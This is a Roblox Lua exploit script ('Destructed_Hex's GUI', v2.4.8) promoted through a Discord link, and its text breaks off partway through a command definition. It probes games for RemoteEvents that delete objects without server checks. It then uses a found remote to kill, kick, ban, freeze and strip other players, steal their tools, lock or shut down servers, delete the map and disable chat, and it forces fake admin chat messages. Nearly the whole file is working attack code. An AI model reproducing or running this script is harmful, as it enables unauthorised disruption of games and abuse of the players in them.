-- join our discord server
-- https://discord.gg/HjZKVFk2ue
local version = "2.4.8"
local fe = string.reverse("eu2kFVKZjH/gg.drocsid")

local StarterGui = game:GetService("StarterGui")
local showNotification = true

function Notify(tl, t, d) 
if showNotification == true then
StarterGui:SetCore("SendNotification", {
	Title = tl;
	Text = t;
	Duration = d;
})
end
end

if game.CoreGui:FindFirstChild("destruct") and game.CoreGui:FindFirstChild("dstc") then
game.CoreGui.destruct:Destroy()
game.CoreGui.dstc:Destroy()
end

if game:GetService("Workspace"):FindFirstChild("Blur") then
game:GetService("Workspace").Blur:Destroy()
end

local BlurFX = Instance.new("BlurEffect")
BlurFX.Size = 0
BlurFX.Name = "Blur"
BlurFX.Parent = workspace.CurrentCamera

local function blurefct(siz)
local TweenService = game:GetService("TweenService")
local goal = {}
goal.Size = siz

local tweenInfo = TweenInfo.new(2)
local tween = TweenService:Create(BlurFX, tweenInfo, goal)

tween:Play()
end

local remote = "nil"
local found = false
local enable = false
local sent = false
local LocalPlayer = game:GetService("Players").LocalPlayer
local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

local checkIn = {"Workspace", "ReplicatedStorage", "CoreGui"}

local receiver = Instance.new("BindableFunction")
receiver.OnInvoke = function(btn) 
if btn == "Match" then
local names = {"Delete", "Remove", "Tool", "Equip", "Destroy", "Change", "Parent", "Clean", "Clear","Bullet", "Bala", "Shoot", "Shot", "Fire", "Segway", "Handless", "Sword", "Attack", "Despawn", "Unspawn", "Deletar", "Apagar"}
if char:FindFirstChild("Body Colors") then
blurefct(20)
Notify("Vulnerability Checker", "Looking up for remotes, may take a while.", 3)
for _, service in pairs(checkIn) do
for i,v in pairs(game:GetService(service):GetDescendants()) do
for _, str in pairs(names) do
if string.match(v.Name, str) and v:IsA("RemoteEvent") then
print("Checking " .. v.Name .. " from " .. service .. " service from " .. str .. " category")
local success, error = pcall(function()
v:FireServer(char["Body Colors"])
found = true
end)
if success then
remote = v
end 
task.wait(0.5)
if char then
if not char:FindFirstChild("Body Colors") then
enable = true
sent = true
return
load()
end
end
end
end
end
end
end

if sent == false then
Notify("Vulnerability Checker", "This game is not vulnerable/supported.", 5)
blurefct(0)
end

elseif btn == "All" then
if char:FindFirstChild("Body Colors") then
blurefct(20)
Notify("Vulnerability Checker", "Looking up for remotes, may take a while.", 3)
for i,v in pairs(game:GetDescendants()) do
if v:IsA("RemoteEvent") then
print("Checking " .. v.Name)
local success, error = pcall(function()
v:FireServer(char["Body Colors"])
found = true
end)
if success then
remote = v
end 
task.wait(0.5)
if char then
if not char:FindFirstChild("Body Colors") then
enable = true
sent = true
return
load()
end
end
end
end
end

if sent == false then
Notify("Vulnerability Checker", "This game is not vulnerable/supported.", 5)
blurefct(0)
end
end
end

if remote == "nil" then
StarterGui:SetCore("SendNotification", {
	Title = "Vuln Scanner";
	Text = "Please select the scan method.";
	Duration = 9e9;
	Button1 = "All";
	Button2 = "Match";
	Callback = receiver;
})
end

function work(arg1)
pcall(function() 
remote:FireServer(arg1, nil) 
end)
end

function GetPlayer(String)
   local Found = {}
   local strl = String:lower()
   if strl == "all" then
       for i,v in pairs(game.Players:GetPlayers()) do
           table.insert(Found,v.Name)
       end
   elseif strl == "others" then
       for i,v in pairs(game.Players:GetPlayers()) do
           if v.DisplayName ~= game.Players.LocalPlayer.DisplayName then
               table.insert(Found,v.Name)
           end
       end  
elseif strl == "me" then
       for i,v in pairs(game.Players:GetPlayers()) do
           if v.DisplayName == game.Players.LocalPlayer.DisplayName then
               table.insert(Found,v.Name)
           end
       end  
elseif strl == "random" then
players = game.Players:GetPlayers()
picked = players[math.random(1, #players)]
table.insert(Found, picked.Name)
   else
       for i,v in pairs(game.Players:GetPlayers()) do
           if v.DisplayName:lower():sub(1, #String) == String:lower() then
               table.insert(Found,v.Name)
           end
       end    
   end
   return Found    
end

function load()
if game.CoreGui:FindFirstChild("destruct") then
game.CoreGui.destruct:Destroy()
end
if enable == true then
blurefct(0)
print("Using " ..remote.Name)
local destruct = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local line = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local scripts = Instance.new("ScrollingFrame")
local banland = Instance.new("TextLabel")
local UIGridLayout = Instance.new("UIGridLayout")
local player = Instance.new("TextButton")
local plrlist = Instance.new("ScrollingFrame")
local plrsgrid = Instance.new("UIGridLayout")
local dstc = Instance.new("ScreenGui")
local note = Instance.new("Frame")
local text = Instance.new("TextLabel")
local logo = Instance.new("ImageLabel")

dstc.Name = "dstc"
dstc.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
dstc.Parent = game.CoreGui

note.Name = "note"
note.Parent = dstc
note.BackgroundColor3 = Color3.fromRGB(44, 45, 45)
note.BorderColor3 = Color3.fromRGB(0, 0, 0)
note.Position = UDim2.new(0.088, 0,0.75, 0)
note.Size = UDim2.new(0, 302, 0, 84)

text.Name = "text"
text.Parent = note
text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
text.BackgroundTransparency = 1.000
text.BorderSizePixel = 0
text.ClipsDescendants = true
text.Position = UDim2.new(0, 0, 0.0666668862, 0)
text.Size = UDim2.new(0, 302, 0, 78)
text.Font = Enum.Font.SourceSansBold
text.TextColor3 = Color3.fromRGB(255, 255, 255)
text.TextSize = 18.000
text.TextWrapped = true
text.TextScaled = true
text.TextYAlignment = Enum.TextYAlignment.Top

logo.Name = "logo"
logo.Parent = note
logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
logo.BackgroundTransparency = 1.000
logo.Position = UDim2.new(-0.350993365, 0, 0, 0)
logo.Size = UDim2.new(0, 106, 0, 84)
logo.Image = "http://www.roblox.com/asset/?id=8388262491"
logo.ScaleType = Enum.ScaleType.Fit

destruct.Name = "destruct"
destruct.Parent = game.CoreGui
destruct.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

main.Name = "main"
main.Parent = destruct
main.BackgroundColor3 = Color3.fromRGB(76, 76, 76)
main.BackgroundTransparency = 0.3
main.BorderSizePixel = 0
main.Position = UDim2.new(0.268847764, 0, 0.372854918, 0)
main.Size = UDim2.new(0, 325, 0, 270)
main.Active = true

player.Name = "player"
player.Parent = main
player.BackgroundColor3 = Color3.fromRGB(85, 85, 85)
player.BorderSizePixel = 0
player.Position = UDim2.new(0.0246153846, 0, 0.870292902, 0)
player.Size = UDim2.new(0, 310, 0, 23)
player.Font = Enum.Font.SourceSans
player.Text = "all"
player.TextColor3 = Color3.fromRGB(255, 255, 255)
player.TextSize = 14.000
player.TextXAlignment = 2
player.AutoButtonColor = false

plrlist.Name = "plrlist"
plrlist.Parent = main
plrlist.Visible = false
plrlist.Active = true
plrlist.BackgroundColor3 = Color3.fromRGB(85, 85, 85)
plrlist.BorderSizePixel = 0
plrlist.Position = UDim2.new(0.0246153846, 0, 0.970292902, 0)
plrlist.Size = UDim2.new(0, 310, 0, 93)
plrlist.ScrollBarThickness = 0

local UserInputService = game:GetService("UserInputService")

local gui = main

local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.05, true)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)

TextLabel.Parent = main
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.292307675, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 134, 0, 25)
TextLabel.Font = Enum.Font.Roboto
TextLabel.Text = "Destructed_Hex's GUI"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 17.000

line.Name = "line"
line.Parent = main
line.BackgroundColor3 = Color3.fromRGB(84, 84, 84)
line.BorderSizePixel = 0
line.Position = UDim2.new(0, 0, 0.106986806, 0)
line.Size = UDim2.new(0, 325, 0, 3)

ImageLabel.Parent = main
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.184615389, 0, 0, 0)
ImageLabel.Size = UDim2.new(0, 25, 0, 25)
ImageLabel.Image = "http://www.roblox.com/asset/?id=8388262491"
ImageLabel.ScaleType = Enum.ScaleType.Fit

scripts.Name = "scripts"
scripts.Parent = main
scripts.Active = true
scripts.BackgroundColor3 = Color3.fromRGB(63, 63, 63)
scripts.BackgroundTransparency = 1
scripts.BorderSizePixel = 0
scripts.Position = UDim2.new(0, 0, 0.134782612, 0)
scripts.Size = UDim2.new(0, 325, 0, 173)
scripts.CanvasSize = UDim2.new(0, 0, 0.5, 0)
scripts.ScrollBarThickness = 0

banland.Parent = main
banland.BackgroundColor3 = Color3.fromRGB(120,120,120)
banland.BackgroundTransparency = 1
banland.BorderSizePixel = 0
banland.Position = UDim2.new(0, 0, 0.779999971, 0)
banland.Size = UDim2.new(0, 325, 0, 25)
banland.Font = Enum.Font.Roboto
banland.Text = "Banland: "
banland.TextColor3 = Color3.fromRGB(152, 152, 152)
banland.TextSize = 1.000
banland.TextScaled = true
banland.TextWrapped = true

UIGridLayout.Parent = scripts
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellSize = UDim2.new(0, 104, 0, 30)

plrsgrid.Parent = plrlist
plrsgrid.SortOrder = Enum.SortOrder.LayoutOrder
plrsgrid.CellSize = UDim2.new(0, 310, 0, 20)
plrsgrid.CellPadding = UDim2.new(0, 5, 0, 0)

local commands = {}
local count = 0
local chat = "temporary"

UIGridLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()

	local absoluteContentSize = UIGridLayout.AbsoluteContentSize

	scripts.CanvasSize = UDim2.new(0, 0, 0, 0.5+absoluteContentSize.Y)
end)

plrsgrid:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()

	local absoluteContentSize = plrsgrid.AbsoluteContentSize

	plrlist.CanvasSize = UDim2.new(0, 0, 0, 0.5+absoluteContentSize.Y)
end)

local function ExecuteCommand(Name)
	Name = Name:lower()
	for i,Command in pairs(string.split(Name, ",")) do
		local Args = Command:split(" ")
		if commands[Args[1]] then
	    if Args[2] then
	        chat = Args[2]
		    player.Text = Args[2]
		end
			commands[Args[1]](Args)
		end
	end
end

local function forcechat(msg)
if game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents") then
local A_1 = "                                                                                                                                              [Destructed's Admin]: "..msg
local A_2 = "All"
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
Event:FireServer(A_1, A_2)
else
return
end
end

local function UpdatePlrs(opt, plr)
if opt == "Add" then
holder = Instance.new("TextButton")
holder.Name = plr
holder.Parent = plrlist
holder.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
holder.BorderSizePixel = 0
holder.Font = Enum.Font.Roboto
holder.Text = plr
holder.TextColor3 = Color3.fromRGB(255, 255, 255)
holder.TextSize = 14.000
holder.AutoButtonColor = false

holder.MouseButton1Click:Connect(function()
player.Text = plr
player.BorderSizePixel = 0
plrlist.Visible = false
end)
elseif opt == "Remove" then
plrlist[plr]:Destroy()
end
end

UpdatePlrs("Add", "all")
UpdatePlrs("Add", "others")
UpdatePlrs("Add", "random")
UpdatePlrs("Add", "me")

for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.DisplayName ~= LocalPlayer.DisplayName then
UpdatePlrs("Add", v.DisplayName)
end
end

player.MouseButton1Click:Connect(function()
if plrlist.Visible == false then
plrlist.Visible = true
player.BorderSizePixel = 1
else
player.BorderSizePixel = 0
plrlist.Visible = false
end
end)

local prefix = ":"
local toKill = {}
local viewing = {}
local admins = {}
local bannedPlayers = {}
local serverlock = false
local sdown = false
local wslock = false
local cam = workspace.CurrentCamera

table.insert(admins, LocalPlayer.Name)

local function rank(lvl, plr)
if lvl == "admin" then
if plr ~= LocalPlayer.Name then
if not table.find(admins, plr) then
table.insert(admins, plr)
forcechat("Set "..plr.."'s rank to Admin")
end
end
end
end

local function rankAll(lvl)
if lvl == "admin" then
forcechat("Set all player's rank to Admin")
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.Name ~= LocalPlayer.Name then
if not table.find(admins, v) then
table.insert(admins, v)
end
end
end
end
end

if game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents") then
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
for _, adm in pairs(admins) do
if adm:find(messageData.FromSpeaker) then
Message = messageData.Message:gsub("/e ", "")
	if string.sub(Message, 1, 1) == prefix then
		Message = Message:gsub(prefix, "")
		ExecuteCommand(Message)
	end
end
end
end)
else
game:GetService("TextChatService").OnIncomingMessage = function(message) 
plr = game:GetService("Players"):GetNameFromUserIdAsync(message.TextSource.UserId)
if message.Status == Enum.TextChatMessageStatus.Success then
for _, adm in pairs(admins) do
if adm:find(plr) then
Message = message.Text:gsub("/e ", "")
	if string.sub(Message, 1, 1) == prefix then
		Message = Message:gsub(prefix, "")
		ExecuteCommand(Message)
	end
end
end
end
end
end

function GetBannedPlayer(target)
local Found = {}
string = target:lower()
for _, str in pairs(bannedPlayers) do
if str:lower():sub(1, #string) == string:lower() then
table.insert(Found, str)
break
end
end
return Found
end

game:GetService("Workspace").ChildAdded:Connect(function(child)
if wslock == true then
if not game:GetService("Players"):GetPlayerFromCharacter(child) then
work(child)
end
end
end)

game:GetService("RunService").Heartbeat:Connect(function()
banland.Text = "Banland: "..table.concat(bannedPlayers, ", ")
for _, plr in pairs(toKill) do
task.spawn(function()
if game:GetService("Players")[plr].Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
            work(game:GetService("Players")[plr].Character.Torso.Neck)
            else
            work(game:GetService("Players")[plr].Character.Head.Neck)
            end
end)
end
for i,v in pairs(viewing) do
if game:GetService("Players")[v].Character:FindFirstChild("Humanoid") then
cam.CameraSubject = game:GetService("Players")[v].Character.Humanoid
end
end
end)

game:GetService("Players").PlayerAdded:Connect(function(plr)
UpdatePlrs("Add", plr.DisplayName)
for i,v in pairs(bannedPlayers) do
if plr.DisplayName == v then
Notify("Banned User", plr.Name .. " Tried to join the game", 5)
work(plr)
end
end
if serverlock == true then
work(plr)
end
if sdown == true then
work(plr)
end
end)

game:GetService("Players").PlayerRemoving:Connect(function(plr)
UpdatePlrs("Remove", plr.DisplayName)
if table.find(viewing, plr.Name) then
if LocalPlayer.Character:FindFirstChild("Humanoid") then
cam.CameraSubject = LocalPlayer.Character.Humanoid
table.clear(viewing)
end
end
if table.find(toKill, plr.Name) then
table.remove(toKill, table.find(toKill, plr.Name))
end
end)

local function AddAdminCommand(nm, func)
commands[nm:lower()] = func
end

local function AddCommand(nm, func)
count = count + 1

btn = Instance.new("TextButton")
btn.Name = nm
btn.Parent = scripts
btn.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
btn.BorderSizePixel = 0
btn.Size = UDim2.new(0, 200, 0, 50)
btn.Font = Enum.Font.Roboto
btn.Text = nm
btn.TextColor3 = Color3.fromRGB(255, 255, 255)
btn.TextSize = 14.000
btn.AutoButtonColor = false

commands[nm:lower()] = func

btn.MouseButton1Click:Connect(function()
func()
end)
end

AddAdminCommand("DeleteName", function()
for i,v in pairs(game:GetDescendants()) do
if v.Name:lower():sub(1, #chat) == chat:lower() then
work(v)
end
end
end)

AddCommand("Kill", function()
for i,v in pairs(GetPlayer(player.Text)) do
            task.spawn(function()
            if game:GetService("Players")[v].Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
            work(game:GetService("Players")[v].Character.Torso.Neck)
            else
            work(game:GetService("Players")[v].Character.Head.Neck)
            end
end)
end
end)

AddCommand("Loopkill", function()
for i,v in pairs(GetPlayer(player.Text)) do
if not table.find(toKill, v) then
table.insert(toKill, v)
end
end
end)

AddCommand("UnLoopkill", function()
for i,v in pairs(GetPlayer(player.Text)) do
if table.find(toKill, v) then
table.remove(toKill, table.find(toKill, v))
end
end
end)

AddCommand("Naked", function()
for i,v in pairs(GetPlayer(player.Text)) do
if game:GetService("Players")[v].Character:FindFirstChildOfClass("Shirt") then
task.spawn(function()
work(game:GetService("Players")[v].Character:FindFirstChildOfClass("Shirt"))
end)
end
if game:GetService("Players")[v].Character:FindFirstChildOfClass("Pants") then
task.spawn(function()
work(game:GetService("Players")[v].Character:FindFirstChildOfClass("Pants"))
end)
end
if game:GetService("Players")[v].Character:FindFirstChild("Shirt Graphic") then
task.spawn(function()
work(game:GetService("Players")[v].Character:FindFirstChild("Shirt Graphic"))
end)
end
end
end)

AddCommand("Btools", function()
local Tool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
local Equipped = false

Tool.RequiresHandle = false
Tool.Name = "Destroy Tool"
local Field = Instance.new("SelectionBox",game.Workspace)
local Mouse = game.Players.LocalPlayer:GetMouse()
Field.LineThickness = 0.1
Tool.TextureId = "http://www.roblox.com/asset/?id=12223874"
Tool.Equipped:Connect(function()
Equipped = true

while Equipped == true do
if Mouse.Target ~= nil then
Field.Adornee = Mouse.Target
Mouse.Icon = "rbxasset://textures/HammerCursor.png"
else
Field.Adornee = nil
Mouse.Icon = ""
end
task.wait()
end
end)


Tool.Unequipped:Connect(function()
Equipped = false
Field.Adornee = nil
Mouse.Icon = ""
end)

Tool.Activated:Connect(function()
if Mouse.Target ~= nil then
work(Mouse.Target)
local ex = Instance.new'Explosion'
ex.BlastRadius = 0
ex.Position = Mouse.Target.Position
ex.Parent = workspace

local AttemptTarget = Mouse.Target
while AttemptTarget ~= nil do
AttemptTarget.Velocity = Vector3.new(0,-1000000000000000,0)
AttemptTarget.CanCollide = false
wait()
end
end
end)
end)

AddCommand("NoLimbs", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
if game:GetService("Players")[v].Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
names = {"Left Arm", "Right Arm", "Left Leg", "Right Leg"}
for _, str in pairs(names) do
work(game:GetService("Players")[v].Character[str])
end
else
names = {"LeftUpperArm", "RightUpperArm", "LeftUpperLeg", "RightUpperLeg"}
for _, str in pairs(names) do
work(game:GetService("Players")[v].Character[str])
end
end
end)
end
end)

AddCommand("Kick", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
work(game:GetService("Players")[v])
end)
end
end)

AddCommand("ClearWs", function()
for i,c in pairs(game:GetService("Workspace"):GetDescendants()) do
        work(c)
end
end)

AddCommand("ClearLighting", function()
for i,v in pairs(game:GetService("Lighting"):GetDescendants()) do 
work(v)
end
end)

AddCommand("ClearBans", function()
table.clear(bannedPlayers)
end)

AddCommand("ClearStarter", function()
task.spawn(function()
for i,v in pairs(game:GetService("StarterGui"):GetDescendants()) do
work(v)
end
for i,v in pairs(game:GetService("StarterPlayer"):GetDescendants()) do
work(v)
end
for i,v in pairs(game:GetService("StarterPack"):GetDescendants()) do
work(v)
end
end)
end)

AddCommand("Ban", function()
for i,v in pairs(GetPlayer(player.Text)) do
if not table.find(bannedPlayers, v) then
plr = game:GetService("Players")[v]
table.insert(bannedPlayers, plr.DisplayName)
work(plr)
end
end
end)

AddCommand("UnBan", function()
for i,v in pairs(GetBannedPlayer(player.Text)) do
table.remove(bannedPlayers, table.find(bannedPlayers, v))
end
end)

AddCommand("Goto", function()
for i,v in pairs(GetPlayer(player.Text)) do
LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v].Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5)
end
end)

AddCommand("Sink", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
destr = game:GetService("Players")[v].Character["HumanoidRootPart"]
work(destr)
end)
end
end)

AddCommand("Faceless", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
work(game:GetService("Players")[v].Character.Head.face)
end)
end
end)

AddCommand("Hatless", function()
for i, v in pairs(GetPlayer(player.Text)) do
for i, h in pairs(game:GetService("Players")[v].Character:GetChildren()) do
if h:IsA("Accessory") then
work(h)
end
end
end
end)

AddCommand("Ragdoll", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
e = game:GetService("Players")[v].Character:FindFirstChild("Humanoid")
work(e)
end)
end
end)

local toggle = false

AddCommand("WsLock", function()
if toggle == false then
game.CoreGui.destruct.main.scripts.WsLock.Text = "UnWsLock"
Notify("Workspace Locked", "New instances will be automatically deleted", 5)
wslock = true
toggle = true
elseif toggle == true then
game.CoreGui.destruct.main.scripts.WsLock.Text = "WsLock"
wslock = false
toggle = false
end
end)


AddCommand("ServerLock", function()
if toggle == false then
game.CoreGui.destruct.main.scripts.ServerLock.Text = "UnServerLock"
Notify("Server Locked", "Nobody can join the server", 5)
serverlock = true
toggle = true
elseif toggle == true then
game.CoreGui.destruct.main.scripts.ServerLock.Text = "ServerLock"
serverlock = false
toggle = false
end
end)

AddCommand("Freeze", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
work(game:GetService("Players")[v].Character.HumanoidRootPart)
work(game:GetService("Players")[v].Character.Humanoid:FindFirstChild("Animator"))
end)
end
end)

AddCommand("DisableChat", function()
if game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents") then
work(game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents)
else
work(game:GetService("TextChatService").TextChannels)
end
end)

AddCommand("Small", function()
for i,v in pairs(GetPlayer(player.Text)) do
local plr = game:GetService("Players")[v]
local Character = plr.Character

if Character.Humanoid:FindFirstChild("BodyTypeScale") then
work(Character.Humanoid.BodyTypeScale)
end
if Character.Humanoid:FindFirstChild("BodyHeightScale") then
work(Character.Humanoid.BodyHeightScale)
end
end
end)

AddCommand("Giant", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
local plr = game:GetService("Players")[v]
local Character = plr.Character
local Humanoid = Character:FindFirstChildOfClass("Humanoid")

function rm()
    for i,v in pairs(Character:GetDescendants()) do
        if v:IsA("BasePart") then
            if v.Name == "Handle" or v.Name == "Head" then
                if Character.Head:FindFirstChild("OriginalSize") then
                    work(Character.Head.OriginalSize)
                end
            else
                for i,cav in pairs(v:GetDescendants()) do
                    if cav:IsA("Attachment") then
                        if cav:FindFirstChild("OriginalPosition") then
                            work(cav.OriginalPosition)
                        end
                    end
                end
                work(v:FindFirstChild("OriginalSize"))
                if v:FindFirstChild("AvatarPartScaleType") then
                    work(v:FindFirstChild("AvatarPartScaleType"))
                end
            end
        end
    end
end

rm()

task.wait(0.5)

work(Humanoid:FindFirstChild("BodyProportionScale"))

task.wait(1)

rm()

task.wait(0.5)

work(Humanoid:FindFirstChild("BodyHeightScale"))

task.wait(1)

rm()

task.wait(0.5)

work(Humanoid:FindFirstChild("BodyWidthScale"))

task.wait(1)

rm()

task.wait(0.5)

work(Humanoid:FindFirstChild("BodyDepthScale"))

task.wait(1)

rm()

task.wait()

task.wait(0.5)
work(Humanoid:FindFirstChild("HeadScale"))
end)
end
end)

AddCommand("View", function()
for i, v in pairs(GetPlayer(player.Text)) do
if game:GetService("Players")[v].Character:FindFirstChild("Humanoid") then
cam.CameraSubject = game:GetService("Players")[v].Character.Humanoid
if not table.find(viewing, v) then
table.insert(viewing, v)
end
end
end
end)

AddCommand("UnView", function()
if LocalPlayer.Character:FindFirstChild("Humanoid") then
cam.CameraSubject = LocalPlayer.Character.Humanoid
table.clear(viewing)
end
end)

AddCommand("Shutdown", function()
sdown = true
Notify("Shutdown", "Shutdowning server..", 5)
for i, v in pairs(game:GetService("Players"):GetPlayers()) do
task.spawn(function()
if v.Name ~= LocalPlayer.Name then
work(v)
repeat wait() until #game:GetService("Players"):GetPlayers() == 1
LocalPlayer:Kick("Server has been shutdown")
end
end)
end
end)

AddCommand("StealTools", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
work(game:GetService("Players")[v].Character:FindFirstChildOfClass("Humanoid"))
repeat wait() until game:GetService("Players")[v].Character:FindFirstChildOfClass("Humanoid").Parent == nil
for i,v in pairs(game:GetService("Players")[v].Character:GetChildren()) do
if v:IsA("BackpackItem") and v:FindFirstChild("Handle") then
LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(v)
end
end
end)
end
end)

AddCommand("Punish", function()
for i,v in pairs(GetPlayer(player.Text)) do
            task.spawn(function()
            work(game:GetService("Players")[v].Character)
end)
end
end)

AddCommand("DeleteMap", function()
for i, v in pairs(game:GetService("Workspace"):GetChildren()) do
if not game:GetService("Players"):GetPlayerFromCharacter(v) then
work(v)
end
end
end)

AddCommand("Sabotage", function()
work(remote)
dstc:Destroy()
destruct:Destroy()
end)

AddCommand("NoTools", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
backpack = game:GetService("Players")[v]["Backpack"] or game:GetService("Players")[v]:WaitForChild("Backpack")
for i,t in pairs(backpack:GetChildren()) do
if t:IsA("BackpackItem") and t:FindFirstChild("Handle") then
work(t)
end
end
end)
end
end)

AddCommand("NoScripts", function()
for i,v in pairs(game:GetDescendants()) do
if v:IsA("Script") or v:IsA("LocalScript") then
work(v)
end
end
end)

AddCommand("NoAnims", function()
for i,v in pairs(GetPlayer(player.Text)) do
if game:GetService("Players")[v].Character:FindFirstChild("Humanoid") then
work(game:GetService("Players")[v].Character.Humanoid:FindFirstChild("Animator"))
end
end
end)

AddCommand("NoSounds", function()
for i,v in pairs(game:GetDescendants()) do
if v:IsA("Sound") then
work(v)
end
end
end)

AddCommand("NoTextures", function()
for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
if v:IsA("Decal") or v:IsA("Texture") then
work(v)
end
end
end)

AddCommand("NoSpawns", function()
for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
if v:IsA("SpawnLocation") then
work(v)
end
end
end)

AddCommand("NoSeats", function()
for i, v in pairs(game:GetService("Workspace"):GetDescendants()) do
if v:IsA("VehicleSeat") or v:IsA("Seat") then
work(v)
end
end
end)

AddCommand("NoMeshes", function()
for i,v in pairs(game:GetDescendants()) do
if v:IsA("Mesh") or v:IsA("SpecialMesh") then
work(v)
end
end
end)

AddCommand("BlockHead", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
if game:GetService("Players")[v].Character.Head:FindFirstChild("Mesh") then
work(game:GetService("Players")[v].Character.Head.Mesh)
end
end)
end
end)

AddCommand("BlockHats", function()
for i,v in pairs(GetPlayer(player.Text)) do
for i,c in pairs(game:GetService("Players")[v].Character:GetDescendants()) do
if c:IsA("SpecialMesh") then
work(c)
end
end
end
end)

AddCommand("BlockTools", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
for _, tool in pairs(game:GetService("Players")[v].Character:GetDescendants()) do
if tool:IsA("Tool") then
if tool:FindFirstChild("Handle") then
work(tool.Handle.Mesh)
end
end
end
end)
end
end)

AddCommand("BlockChar", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
for _, mesh in pairs(game:GetService("Players")[v].Character:GetDescendants()) do
if mesh:IsA("CharacterMesh") then
work(mesh)
end
end
end)
end
end)

AddCommand("Creeper", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
for _, mesh in pairs(game:GetService("Players")[v].Character:GetDescendants()) do
if mesh:IsA("CharacterMesh") then
work(mesh)
end
end
work(game:GetService("Players")[v].Character.Head.Mesh)
work(game:GetService("Players")[v].Character.Humanoid["Animator"])
if game:GetService("Players")[v].Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
names = {"Left Arm", "Right Arm"}
for _, str in pairs(names) do
work(game:GetService("Players")[v].Character[str])
end
else
names = {"LeftUpperArm", "RightUpperArm"}
for _, str in pairs(names) do
work(game:GetService("Players")[v].Character[str])
end
end
for i, h in pairs(game:GetService("Players")[v].Character:GetChildren()) do
if h:IsA("Accessory") then
work(h)
end
end
if game:GetService("Players")[v].Character:FindFirstChildOfClass("Shirt") then
work(game:GetService("Players")[v].Character:FindFirstChildOfClass("Shirt"))
end
if game:GetService("Players")[v].Character:FindFirstChildOfClass("Pants") then
work(game:GetService("Players")[v].Character:FindFirstChildOfClass("Pants"))
end
if game:GetService("Players")[v].Character:FindFirstChild("Shirt Graphic") then
work(game:GetService("Players")[v].Character:FindFirstChild("Shirt Graphic"))
end
end)
end
end)

AddCommand("Invisible", function()
for i,v in pairs(GetPlayer(player.Text)) do
if game:GetService("Players")[v].Character:FindFirstChild("LowerTorso") then
if game:GetService("Players")[v].Character.LowerTorso:FindFirstChild("Root") then
work(game:GetService("Players")[v].Character.LowerTorso.Root)
work(game:GetService("Players")[v].Character.Humanoid.Animator)
end
end
end
end)

AddCommand("Admin", function()
if player.Text == "all" or player.Text == "others" then
rankAll("admin")
else
for i,v in pairs(GetPlayer(player.Text)) do
rank("admin", v)
end
end
end)

AddCommand("UnAdmin", function()
for i,v in pairs(GetPlayer(player.Text)) do
if v ~= LocalPlayer.Name then
if table.find(admins, v) then
table.remove(admins, table.find(admins, v))
end
end
end
end)

AddCommand("Explorer", function()
